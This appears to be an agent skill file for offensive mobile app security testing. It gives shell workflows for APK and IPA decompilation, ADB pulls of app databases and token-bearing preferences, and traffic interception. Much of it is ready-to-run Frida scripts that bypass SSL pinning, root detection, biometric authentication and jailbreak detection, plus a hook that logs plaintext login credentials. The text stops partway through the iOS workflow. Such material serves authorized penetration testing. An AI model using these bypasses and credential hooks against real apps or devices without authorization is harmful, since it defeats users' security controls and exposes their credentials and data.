# Mobile Attacker

Mobile application security — Android APK analysis (apktool/jadx), iOS IPA analysis, Frida instrumentation, SSL/root/biometric/jailbreak detection bypass, traffic interception (Burp/mitmproxy), OWASP Mobile Top 10, and MobSF automated scanning.

## Tags
offensive, mobile, appsec, Android, iOS

## Triggers
mobile security, Android, iOS, APK, IPA, Frida, SSL pinning, root detection, biometric bypass, jailbreak, MobSF, mitmproxy

## Recommended Model
sonnet

---
## Cybersecurity Skills (Invoke First)

Before starting mobile testing, invoke these skills via the Skill tool:
- `cybersecurity-skills:conducting-mobile-app-penetration-test`
- `cybersecurity-skills:performing-android-app-static-analysis-with-mobsf`
- `cybersecurity-skills:performing-dynamic-analysis-of-android-app`
- `cybersecurity-skills:reverse-engineering-android-malware-with-jadx`
- `cybersecurity-skills:intercepting-mobile-traffic-with-burpsuite`
- `cybersecurity-skills:performing-mobile-app-certificate-pinning-bypass`
- `cybersecurity-skills:analyzing-ios-app-security-with-objection`

## Scope Enforcement
Verify app package name (e.g., com.example.app) and backend domains are in scope.txt.
Only test on owned/authorized test devices or emulators.
Do not exfiltrate user PII from the device.

## Android Static Analysis

### APK Decompilation
```bash
mkdir -p evidence/$(date +%Y%m%d)/$TARGET/mobile/{static,dynamic,traffic,frida}

# Decompile APK with apktool (smali + resources)
apktool d $APK_FILE \
  -o evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/ \
  --force 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool.log

# Decompile to Java with jadx
jadx \
  -d evidence/$(date +%Y%m%d)/$TARGET/mobile/static/jadx_output/ \
  --export-gradle \
  $APK_FILE 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/jadx.log

# Extract strings of interest
grep -rE \
  "http[s]?://|password|secret|api_key|firebase|aws|key=|token|bearer|BasicAuth|encrypt" \
  evidence/$(date +%Y%m%d)/$TARGET/mobile/static/jadx_output/ \
  --include="*.java" 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/interesting_strings.txt

# Check Android Manifest
cat evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/AndroidManifest.xml | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/manifest.txt

# Check for exported activities / services / receivers (potential attack surface)
grep -E "exported=\"true\"|android:exported" \
  evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/AndroidManifest.xml | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/exported_components.txt

# Extract hardcoded values from resources
grep -rE "API_KEY|SECRET|PASSWORD|FIREBASE|GOOGLE_API" \
  evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/res/ 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/hardcoded_values.txt

# Check google-services.json (Firebase config)
find evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ \
  -name "google-services.json" -o -name "GoogleService-Info.plist" 2>/dev/null | \
  xargs cat 2>/dev/null | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/firebase_config.txt

# Find network_security_config (SSL pinning config)
find evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/ \
  -name "network_security_config.xml" 2>/dev/null | \
  xargs cat 2>/dev/null | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/nsc.xml
```

### MobSF Automated Scan
```bash
# Start MobSF if not running
# docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Upload APK to MobSF
SCAN=$(curl -s -X POST \
  "http://localhost:8000/api/v1/upload" \
  -H "Authorization: $MOBSF_API_KEY" \
  -F "file=@$APK_FILE" | python3 -m json.tool)

echo $SCAN | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('hash',''))" | \
  read SCAN_HASH

# Trigger scan
curl -s -X POST \
  "http://localhost:8000/api/v1/scan" \
  -H "Authorization: $MOBSF_API_KEY" \
  -d "scan_type=apk&file_name=$(basename $APK_FILE)&hash=$SCAN_HASH" | \
  python3 -m json.tool 2>&1

# Download PDF report
curl -s -X POST \
  "http://localhost:8000/api/v1/download_pdf" \
  -H "Authorization: $MOBSF_API_KEY" \
  -d "hash=$SCAN_HASH" \
  -o evidence/$(date +%Y%m%d)/$TARGET/mobile/static/mobsf_report.pdf 2>&1

echo "[*] MobSF report saved to evidence/$(date +%Y%m%d)/$TARGET/mobile/static/mobsf_report.pdf"
```

## ADB Dynamic Analysis
```bash
# List connected devices
adb devices

# Shell access
adb shell
adb -s $DEVICE_ID shell

# App info
adb shell pm list packages | grep -i $APP_NAME
adb shell dumpsys package $PACKAGE_NAME | head -100 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/package_info.txt

# Check app data directory (requires root or debuggable app)
adb shell run-as $PACKAGE_NAME ls -la /data/data/$PACKAGE_NAME/ 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/app_data_listing.txt

# Pull app databases (SQLite)
adb shell run-as $PACKAGE_NAME cp /data/data/$PACKAGE_NAME/databases/ \
  /sdcard/pentest_dbs/ 2>/dev/null || true
adb pull /sdcard/pentest_dbs/ evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/ 2>/dev/null

# Pull SharedPreferences (often contains tokens)
adb shell run-as $PACKAGE_NAME cp -r \
  /data/data/$PACKAGE_NAME/shared_prefs/ /sdcard/pentest_prefs/ 2>/dev/null || true
adb pull /sdcard/pentest_prefs/ evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/shared_prefs/ 2>/dev/null

# Real-time logcat filtering
adb logcat -v time | \
  grep -iE "password|token|secret|api_key|bearer|credential|auth|login" | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/logcat_secrets.txt &

# Start app and trigger login, payment flows, etc. during logcat capture
adb shell am start -n "$PACKAGE_NAME/$MAIN_ACTIVITY" 2>&1

# Activity manager for intent testing
adb shell am start \
  -a android.intent.action.VIEW \
  -d "$DEEP_LINK_URI" \
  $PACKAGE_NAME 2>&1

# Screenshot the current screen
adb shell screencap /sdcard/screen.png && adb pull /sdcard/screen.png \
  evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/screen_$(date +%s).png 2>&1
```

## Frida Instrumentation
```bash
# Install frida-server on device (requires root)
# adb push frida-server /data/local/tmp/
# adb shell chmod 755 /data/local/tmp/frida-server
# adb shell /data/local/tmp/frida-server &

# List running processes
frida-ps -U 2>&1 | grep -i $APP_NAME

# SSL pinning bypass (universal — works on most apps)
frida -U \
  -l /opt/frida-scripts/ssl_bypass.js \
  -f $PACKAGE_NAME \
  --no-pause 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/ssl_bypass.log &

# Alternative SSL bypass with objection
objection -g $PACKAGE_NAME explore 2>&1 << 'EOF'
android sslpinning disable
android root disable
ios sslpinning disable
EOF

# Root detection bypass
frida -U -l /opt/frida-scripts/root_bypass.js -f $PACKAGE_NAME --no-pause 2>&1

# Dump all class/method names
frida -U -l - -f $PACKAGE_NAME --no-pause 2>&1 << 'EOF'
Java.perform(() => {
    Java.enumerateLoadedClasses({
        onMatch: function(name) {
            if (name.includes('com.target')) console.log(name);
        },
        onComplete: function() {}
    });
});
EOF

# Hook specific method to log arguments and return values
frida -U -e "
Java.perform(() => {
    const AuthClass = Java.use('com.target.app.AuthManager');
    AuthClass.login.overload('java.lang.String', 'java.lang.String').implementation = function(user, pass) {
        console.log('[*] Login called: user=' + user + ' pass=' + pass);
        return this.login(user, pass);
    };
});
" -f $PACKAGE_NAME --no-pause 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/login_hook.log

# Dump keystore
frida -U -l /opt/frida-scripts/keystore_dump.js -f $PACKAGE_NAME --no-pause 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/keystore_dump.txt
```

## Traffic Interception (Burp Suite / mitmproxy)
```bash
# Configure device proxy → attacker IP:8080
# For system-level proxy:
adb shell settings put global http_proxy $LHOST:8080

# Install Burp CA on device (Android < 7.0 or rooted)
# adb push cacert.der /sdcard/cacert.der
# Settings → Security → Install certificate

# For Android 7+ with SSL pinning bypass via Frida:
# Run frida ssl bypass FIRST, then configure proxy

# mitmproxy for traffic capture
mitmdump \
  -p 8080 \
  --set console_eventlog_verbosity=error \
  -w evidence/$(date +%Y%m%d)/$TARGET/mobile/traffic/traffic.mitm 2>&1 &

# After capture, analyze with mitmproxy
mitmproxy -r evidence/$(date +%Y%m%d)/$TARGET/mobile/traffic/traffic.mitm 2>&1

# Convert to HAR for analysis
mitmdump -r evidence/$(date +%Y%m%d)/$TARGET/mobile/traffic/traffic.mitm \
  --set hardump=evidence/$(date +%Y%m%d)/$TARGET/mobile/traffic/traffic.har 2>&1

# Remove proxy setting
adb shell settings put global http_proxy :0
```

## iOS Analysis (IPA)
```bash
# Unpack IPA
cp $IPA_FILE evidence/$(date +%Y%m%d)/$TARGET/mobile/static/app.ipa
cd evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ && unzip app.ipa -d ipa_unpacked/ 2>&1

# Check Info.plist
find ipa_unpacked/ -name "Info.plist" | xargs plutil -p 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ios_info_plist.txt

# Look for embedded secrets
grep -rE "api_key|secret|password|token|aws|firebase|http" \
  ipa_unpacked/ --include="*.plist" --include="*.json" --include="*.js" 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ios_strings.txt

# Strings from binary
find ipa_unpacked/Payload -name "*.app" -type d | \
  xargs -I{} strings {}/$(ls {}/ | grep -v ".") 2>/dev/null | \
  grep -iE "http|api|key|secret|password" | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ios_binary_strings.txt

# Frida on iOS (requires jailbreak + frida-server on device)
frida-ps -U 2>&1 | grep -i $APP_NAME

# iOS SSL pinning bypass
frida -U \
  -l /opt/frida-scripts/ios_sslpinning_bypass.js \
  -f $BUNDLE_ID \
  --no-pause 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/ios_ssl_bypass.log

# Keychain dump on jailbroken device
frida -U \
  -l /opt/frida-scripts/ios_keychain_dump.js \
  $BUNDLE_ID 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/ios_keychain.json
```

## Evidence Output
Write to `evidence/$(date +%Y%m%d)/$TARGET/mobile/mobile_findings.md`:
```markdown
## Mobile App Assessment — $TARGET ($PACKAGE_NAME) — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### App Info
- Package: $PACKAGE_NAME
- Version: [from manifest]
- Min SDK: [from manifest]
- Platform: [Android/iOS]

### Hardcoded Secrets
| Type | Value Location (NO PLAINTEXT) | File | Risk |
|------|------------------------------|------|------|

### OWASP Mobile Top 10 Findings
| OWASP # | Title | Finding | Severity |
|---------|-------|---------|----------|

### Traffic Findings
| Endpoint | Issue | Severity |
|----------|-------|----------|

### Credentials Captured
| Source | Type | Hash/Ref Location |
|--------|------|-------------------|

## Frida Script Templates

### Template 1: Universal SSL Pinning Bypass
```javascript
// ssl_pin_bypass.js — Bypass SSL certificate pinning on Android/iOS
// Usage: frida -U -f com.target.app -l ssl_pin_bypass.js --no-pause

Java.perform(function() {
    console.log('[*] SSL Pinning Bypass — Loading...');

    // Method 1: OkHTTP3 CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log('[+] OkHTTP3 CertificatePinner.check() bypassed for: ' + hostname);
            console.log('[+] Peer certificates: ' + peerCertificates);
        };
        console.log('[+] OkHTTP3 CertificatePinner bypass installed');
    } catch (e) {
        console.log('[-] OkHTTP3 not found: ' + e);
    }

    // Method 2: TrustManager bypass
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');

        var TrustManager = Java.registerClass({
            name: 'com.bypass.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) { },
                checkServerTrusted: function(chain, authType) { },
                getAcceptedIssuers: function() { return []; }
            }
        });

        var TrustManagers = [TrustManager.$new()];
        var sslContext = SSLContext.getInstance('TLS');
        sslContext.init(null, TrustManagers, null);
        console.log('[+] Custom TrustManager installed');
    } catch (e) {
        console.log('[-] TrustManager bypass failed: ' + e);
    }

    // Method 3: WebViewClient SSL bypass
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            console.log('[+] WebViewClient SSL error bypassed: ' + error.toString());
            handler.proceed();
        };
        console.log('[+] WebViewClient SSL bypass installed');
    } catch (e) {
        console.log('[-] WebViewClient not found: ' + e);
    }

    // Method 4: HttpsURLConnection HostnameVerifier bypass
    try {
        var HostnameVerifier = Java.use('javax.net.ssl.HostnameVerifier');
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');

        var BypassVerifier = Java.registerClass({
            name: 'com.bypass.BypassVerifier',
            implements: [HostnameVerifier],
            methods: {
                verify: function(hostname, session) {
                    console.log('[+] HostnameVerifier bypass: ' + hostname);
                    return true;
                }
            }
        });
        console.log('[+] HostnameVerifier bypass installed');
    } catch (e) {
        console.log('[-] HostnameVerifier bypass failed: ' + e);
    }

    // Method 5: NetworkSecurityConfig Trust Anchor bypass (Android 7+)
    try {
        var ArrayL = Java.use('java.util.ArrayList');
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log('[+] NetworkSecurityConfig TrustAnchor bypass for: ' + host);
            return untrustedChain;
        };
        console.log('[+] NetworkSecurityConfig bypass installed');
    } catch (e) {
        console.log('[-] TrustManagerImpl not found: ' + e);
    }

    console.log('[*] SSL Pinning Bypass — All methods loaded');
});
```

### Template 2: Root Detection Bypass
```javascript
// root_bypass.js — Bypass common root detection mechanisms
// Usage: frida -U -f com.target.app -l root_bypass.js --no-pause

Java.perform(function() {
    console.log('[*] Root Detection Bypass — Loading...');

    // Method 1: Bypass file existence checks (su, Magisk, SuperUser)
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootPaths = [
            '/system/app/Superuser.apk', '/system/xbin/su', '/system/bin/su',
            '/sbin/su', '/data/local/xbin/su', '/data/local/bin/su',
            '/system/sd/xbin/su', '/system/bin/failsafe/su',
            '/su/bin/su', '/magisk/.core/bin/su',
            '/system/app/SuperSU', '/system/app/Superuser',
            '/data/local/su', '/su/bin', '/sbin/.magisk',
            '/system/bin/.ext/.su', '/system/usr/we-need-root/su',
            '/system/app/KingUser', '/data/data/com.koushikdutta.superuser',
            '/system/etc/init.d/99SuperSUDaemon', '/dev/com.koushikdutta.superuser.daemon/'
        ];
        if (rootPaths.indexOf(path) !== -1) {
            console.log('[+] Root path hidden: ' + path);
            return false;
        }
        return this.exists.call(this);
    };

    // Method 2: Bypass Runtime.exec checks (which/su commands)
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('[Ljava.lang.String;').implementation = function(cmdArray) {
        var cmd = cmdArray.join(' ');
        if (cmd.indexOf('which su') !== -1 || cmd.indexOf('su') !== -1 ||
            cmd.indexOf('busybox') !== -1 || cmd.indexOf('magisk') !== -1) {
            console.log('[+] Runtime.exec blocked: ' + cmd);
            throw Java.use('java.io.IOException').$new('Command not found');
        }
        return this.exec(cmdArray);
    };
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') !== -1 || cmd.indexOf('busybox') !== -1 ||
            cmd.indexOf('magisk') !== -1 || cmd.indexOf('which') !== -1) {
            console.log('[+] Runtime.exec(String) blocked: ' + cmd);
            throw Java.use('java.io.IOException').$new('Command not found');
        }
        return this.exec(cmd);
    };

    // Method 3: Bypass PackageManager checks for root apps
    var PackageManager = Java.use('android.app.ApplicationPackageManager');
    PackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkg, flags) {
        var rootPkgs = ['com.noshufou.android.su', 'com.koushikdutta.superuser',
            'eu.chainfire.supersu', 'com.topjohnwu.magisk', 'com.koushikdutta.superuser',
            'com.thirdparty.superuser', 'com.yellowes.su', 'com.devadvance.rootcloak',
            'com.devadvance.rootcloakpro', 'de.robv.android.xposed.installer',
            'com.saurik.substrate', 'com.noshufou.android.su.elite',
            'com.koushikdutta.superuser.permission'];
        if (rootPkgs.indexOf(pkg) !== -1) {
            console.log('[+] Root package hidden: ' + pkg);
            throw Java.use('android.content.pm.PackageManager$NameNotFoundException').$new(pkg);
        }
        return this.getPackageInfo(pkg, flags);
    };

    // Method 4: Bypass System.getProperty("ro.debuggable")
    var System = Java.use('java.lang.System');
    System.getProperty.overload('java.lang.String').implementation = function(name) {
        if (name === 'ro.debuggable' || name === 'ro.build.tags') {
            console.log('[+] System.getProperty("' + name + '") bypassed');
            return '0';
        }
        return this.getProperty(name);
    };

    // Method 5: Bypass SafetyNet / Play Integrity
    try {
        var DroidGuard = Java.use('com.google.android.gms.droidguard.DroidGuard');
        DroidGuard.getCreator.implementation = function(ctx) {
            console.log('[+] SafetyNet/DroidGuard bypassed');
            return this.getCreator(ctx);
        };
    } catch (e) {
        console.log('[-] SafetyNet bypass not available: ' + e);
    }

    console.log('[*] Root Detection Bypass — All methods loaded');
});
```

### Template 3: Certificate Pinning Bypass (Network Security Config)
```javascript
// cert_pin_bypass.js — Targeted Network Security Config pinning bypass
// Usage: frida -U -f com.target.app -l cert_pin_bypass.js --no-pause

Java.perform(function() {
    console.log('[*] Certificate Pinning Bypass (NSC) — Loading...');

    // Bypass pin_sha256 from Network Security Config
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');

        // Override verifyChain to accept any certificate
        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log('[+] TrustManagerImpl.verifyChain bypassed for host: ' + host);
            return untrustedChain;
        };

        console.log('[+] TrustManagerImpl pin bypass installed');
    } catch (e) {
        console.log('[-] TrustManagerImpl: ' + e);
    }

    // Bypass Android NetworkSecurityConfig trust anchors
    try {
        var NetworkSecurityTrustManager = Java.use('android.security.net.config.NetworkSecurityTrustManager');
        NetworkSecurityTrustManager.checkServerTrusted.overload('[Ljava.security.cert.X509Certificate;', 'java.lang.String').implementation = function(chain, authType) {
            console.log('[+] NetworkSecurityTrustManager checkServerTrusted bypassed');
        };
        NetworkSecurityTrustManager.checkServerTrusted.overload('[Ljava.security.cert.X509Certificate;', 'java.lang.String', 'java.lang.String').implementation = function(chain, host, authType) {
            console.log('[+] NetworkSecurityTrustManager checkServerTrusted(host) bypassed for: ' + host);
        };
        console.log('[+] NetworkSecurityTrustManager bypass installed');
    } catch (e) {
        console.log('[-] NetworkSecurityTrustManager: ' + e);
    }

    // Bypass Custom Pinning implementations (common patterns)
    try {
        // Look for common pinning class names
        var targetClasses = [
            'com.target.security.CertificatePinner',
            'com.target.security.PinningHelper',
            'com.target.network.SSLPinner',
            'com.target.api.SecurityInterceptor'
        ];

        Java.enumerateLoadedClasses({
            onMatch: function(name) {
                if (name.toLowerCase().indexOf('pinner') !== -1 ||
                    name.toLowerCase().indexOf('certpinning') !== -1 ||
                    name.toLowerCase().indexOf('trustpinning') !== -1) {
                    console.log('[+] Found pinning-related class: ' + name);
                    try {
                        var cls = Java.use(name);
                        var methods = cls.class.getDeclaredMethods();
                        methods.forEach(function(method) {
                            if (method.getName().indexOf('check') !== -1 ||
                                method.getName().indexOf('verify') !== -1 ||
                                method.getName().indexOf('validate') !== -1) {
                                console.log('[*] Hooking: ' + name + '.' + method.getName());
                            }
                        });
                    } catch (e) { }
                }
            },
            onComplete: function() { }
        });
    } catch (e) {
        console.log('[-] Custom pinning search: ' + e);
    }

    console.log('[*] Certificate Pinning Bypass (NSC) — All methods loaded');
});
```

### Template 4: Biometric Bypass
```javascript
// biometric_bypass.js — Bypass fingerprint/face authentication
// Usage: frida -U -f com.target.app -l biometric_bypass.js --no-pause

Java.perform(function() {
    console.log('[*] Biometric Bypass — Loading...');

    // Method 1: BiometricPrompt bypass (Android 9+)
    try {
        var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
        BiometricPrompt.authenticate.overload('android.hardware.biometrics.BiometricPrompt$CryptoObject',
            'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation = function(crypto, executor, callback) {
            console.log('[+] BiometricPrompt.authenticate() bypassed');
            var AuthenticationCallback = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
            callback.onAuthenticationSucceeded(null);
        };
        console.log('[+] BiometricPrompt bypass installed');
    } catch (e) {
        console.log('[-] BiometricPrompt: ' + e);
    }

    // Method 2: FingerprintManagerCompat bypass (support library)
    try {
        var FingerprintManagerCompat = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat');
        FingerprintManagerCompat.authenticate.implementation = function(crypto, callback, handler) {
            console.log('[+] FingerprintManagerCompat.authenticate() bypassed');
            callback.onAuthenticationSucceeded(null);
        };
        console.log('[+] FingerprintManagerCompat bypass installed');
    } catch (e) {
        console.log('[-] FingerprintManagerCompat: ' + e);
    }

    // Method 3: FingerprintManager (deprecated but still in use)
    try {
        var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        FingerprintManager.authenticate.implementation = function(crypto, callback, handler) {
            console.log('[+] FingerprintManager.authenticate() bypassed');
            callback.onAuthenticationSucceeded(null);
        };
        console.log('[+] FingerprintManager bypass installed');
    } catch (e) {
        console.log('[-] FingerprintManager: ' + e);
    }

    // Method 4: Hook app-level biometric wrappers
    Java.enumerateLoadedClasses({
        onMatch: function(name) {
            if (name.toLowerCase().indexOf('biometric') !== -1 &&
                name.toLowerCase().indexOf('callback') !== -1) {
                try {
                    var cls = Java.use(name);
                    if (cls.onAuthenticationSucceeded) {
                        cls.onAuthenticationSucceeded.implementation = function(result) {
                            console.log('[+] App biometric callback bypassed: ' + name);
                            this.onAuthenticationSucceeded(result);
                        };
                    }
                } catch (e) { }
            }
        },
        onComplete: function() { }
    });

    console.log('[*] Biometric Bypass — All methods loaded');
});
```

### Template 5: Jailbreak Detection Bypass (iOS)
```javascript
// jailbreak_bypass.js — Bypass jailbreak detection on iOS
// Usage: frida -U -f com.target.app -l jailbreak_bypass.js --no-pause
// Requires: jailbroken iOS device with Frida server

if (ObjC.available) {
    console.log('[*] Jailbreak Detection Bypass (iOS) — Loading...');

    // Method 1: Bypass file existence checks
    var FileManager = ObjC.classes.NSFileManager;
    var fileExistsAtPath = FileManager['- fileExistsAtPath:'];
    fileExistsAtPath.implementation = function(path) {
        var jbPaths = [
            '/Applications/Cydia.app', '/Applications/Sileo.app',
            '/Library/MobileSubstrate/DynamicLibraries', '/Library/MobileSubstrate',
            '/bin/bash', '/bin/sh', '/usr/sbin/sshd', '/etc/apt', '/etc/ssh/sshd_config',
            '/private/var/lib/apt', '/private/var/lib/cydia',
            '/private/var/mobile/Library/SBSettings/Themes',
            '/private/var/stash', '/private/var/tmp/cydia.log',
            '/System/Library/LaunchDaemons/com.ikey.bbot.plist',
            '/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist',
            '/usr/bin/sshd', '/usr/bin/ssh', '/usr/libexec/sftp-server',
            '/usr/libexec/ssh-keysign', '/Applications/FakeCarrier.app',
            '/Applications/Icy.app', '/Applications/IntelliScreen.app',
            '/Applications/MxTube.app', '/Applications/RockApp.app',
            '/Applications/SBSettings.app', '/Applications/WinterBoard.app'
        ];

        for (var i = 0; i < jbPaths.length; i++) {
            if (path.toString() === jbPaths[i]) {
                console.log('[+] Jailbreak path hidden: ' + path);
                return false;
            }
        }
        return fileExistsAtPath.call(this, path);
    };

    // Method 2: Bypass UIApplication canOpenURL checks
    var UIApplication = ObjC.classes.UIApplication;
    var canOpenURL = UIApplication['- canOpenURL:'];
    canOpenURL.implementation = function(url) {
        var urlStr = url.toString();
        var jbSchemes = ['cydia://', 'sileo://', 'activator://',
            'file://', 'ssh://', 'apt://'];
        for (var i = 0; i < jbSchemes.length; i++) {
            if (urlStr.indexOf(jbSchemes[i]) === 0) {
                console.log('[+] canOpenURL jailbreak scheme blocked: ' + urlStr);
                return false;
            }
        }
        return canOpenURL.call(this, url);
    };

    // Method 3: Bypass_dyld_get_image_name check (checking for suspicious dylibs)
    try {
        var dyld = new Module('_dyld_get_image_header_0') || new Module('_dyld_get_image_name_0');
        console.log('[+] _dyld detection hook available');
    } catch (e) {
        console.log('[-] dyld hook: ' + e);
    }

    // Method 4: Bypass stat/fopen checks for suspicious files
    Interceptor.attach(Module.findExportByName(null, 'stat'), {
        onEnter: function(args) {
            var path = Memory.readUtf8String(args[0]);
            this.isJBPath = false;
            var jbPaths = ['/bin/bash', '/bin/sh', '/usr/sbin/sshd', '/etc/apt',
                '/Applications/Cydia.app', '/Library/MobileSubstrate'];
            for (var i = 0; i < jbPaths.length; i++) {
                if (path && path.indexOf(jbPaths[i]) !== -1) {
                    this.isJBPath = true;
                    console.log('[+] stat() JB path blocked: ' + path);
                }
            }
        },
        onLeave: function(retval) {
            if (this.isJBPath) retval.replace(-1);
        }
    });

    console.log('[*] Jailbreak Detection Bypass (iOS) — All methods loaded');
} else {
    console.log('[-] Objective-C runtime not available');
}
```

## Android APK Analysis: Complete Workflow

### Phase 1: Static Analysis Pipeline
```bash
MOB=evidence/$(date +%Y%m%d)/$TARGET/mobile
mkdir -p $MOB/{static,dynamic,traffic,frida,reports}

# Step 1: APK information extraction
APKTOOL_DIR=$MOB/static/apktool_out
aapt dump badging $APK_FILE 2>&1 | tee $MOB/static/apk_info.txt
aapt dump permissions $APK_FILE 2>&1 | tee $MOB/static/permissions.txt

# Step 2: Decompile with apktool
apktool d $APK_FILE -o $APKTOOL_DIR --force 2>&1 | tee $MOB/static/apktool.log

# Step 3: Decompile to Java with jadx (full decompilation)
jadx -d $MOB/static/jadx_out --show-bad-code --no-inline-anonymous \
  --threads-count 4 $APK_FILE 2>&1 | tee $MOB/static/jadx.log

# Step 4: Extract all strings and classify
find $MOB/static/jadx_out -name "*.java" -exec grep -l \
  -E "http[s]?://|password|secret|api_key|firebase|aws|token|bearer|Authorization|BasicAuth" \
  {} \; 2>/dev/null | \
  tee $MOB/static/sensitive_files.txt

# Step 5: Manifest security analysis
python3 << 'PYEOF'
import xml.etree.ElementTree as ET

manifest_path = "$APKTOOL_DIR/AndroidManifest.xml"
tree = ET.parse(manifest_path)
root = tree.getroot()
ns = {'android': 'http://schemas.android.com/apk/res/android'}

print("=== Security-Relevant Manifest Entries ===")

# Backup/exported components
for app in root.iter('application'):
    for comp in app:
        exported = comp.get('{http://schemas.android.com/apk/res/android}exported', 'false')
        name = comp.get('{http://schemas.android.com/apk/res/android}name', '')
        if exported == 'true' and name:
            print(f"[HIGH] Exported {comp.tag}: {name}")

# Dangerous permissions
for perm in root.iter('uses-permission'):
    pname = perm.get('{http://schemas.android.com/apk/res/android}name', '')
    dangerous = ['WRITE_SETTINGS', 'SYSTEM_ALERT_WINDOW', 'READ_LOGS',
        'INSTALL_PACKAGES', 'DELETE_PACKAGES', 'RECEIVE_BOOT_COMPLETED',
        'READ_CONTACTS', 'READ_CALL_LOG', 'READ_SMS', 'SEND_SMS',
        'RECORD_AUDIO', 'CAMERA', 'ACCESS_FINE_LOCATION', 'BODY_SENSORS']
    for d in dangerous:
        if d in pname:
            print(f"[PERM] {pname}")

# Debuggable flag
for app in root.iter('application'):
    debuggable = app.get('{http://schemas.android.com/apk/res/android}debuggable', 'false')
    if debuggable == 'true':
        print("[HIGH] Application is debuggable!")

# Allow backup
    allow_backup = app.get('{http://schemas.android.com/apk/res/android}allowBackup', 'true')
    if allow_backup == 'true':
        print("[MED] allowBackup is enabled — full backup extraction possible")

# Network security config
    nsc = app.get('{http://schemas.android.com/apk/res/android}networkSecurityConfig', '')
    if nsc:
        print(f"[INFO] Network Security Config: {nsc}")
    else:
        print("[MED] No Network Security Config — default cleartext policy")
PYEOF

# Step 6: Security patterns scan
find $MOB/static/jadx_out -name "*.java" -exec grep -l \
  -E "WebView.*loadUrl|addJavascriptInterface|setJavaScriptEnabled\(true\)" \
  {} \; 2>/dev/null | tee $MOB/static/webview_issues.txt

find $MOB/static/jadx_out -name "*.java" -exec grep -l \
  -E "ClipData|Intent.*putExtra|PendingIntent|FileProvider" \
  {} \; 2>/dev/null | tee $MOB/static/intent_issues.txt

find $MOB/static/jadx_out -name "*.java" -exec grep -l \
  -E "AES|DES|RSA|Cipher|SecretKey|KeyGenerator" \
  {} \; 2>/dev/null | tee $MOB/static/crypto_usage.txt
```

## iOS IPA Analysis: Deep Workflow

### Phase 1: Static Analysis
```bash
IPA_DIR=$MOB/static/ipa_unpacked
cp $IPA_FILE $MOB/static/app.ipa
cd $MOB/static && unzip -o app.ipa -d $IPA_DIR 2>&1 | tail -5

# Info.plist analysis
INFO_PLIST=$(find $IPA_DIR -name "Info.plist" | head -1)
plutil -p $INFO_PLIST 2>&1 | tee $MOB/static/ios_plist.txt

# Check binary for architecture
BINARY=$(find $IPA_DIR/Payload -name "*.app" -type d | head -1)
BINARY_PATH=$(find $BINARY -maxdepth 1 -type f -perm +111 | head -1)
file $BINARY_PATH 2>&1 | tee $MOB/static/ios_binary_info.txt
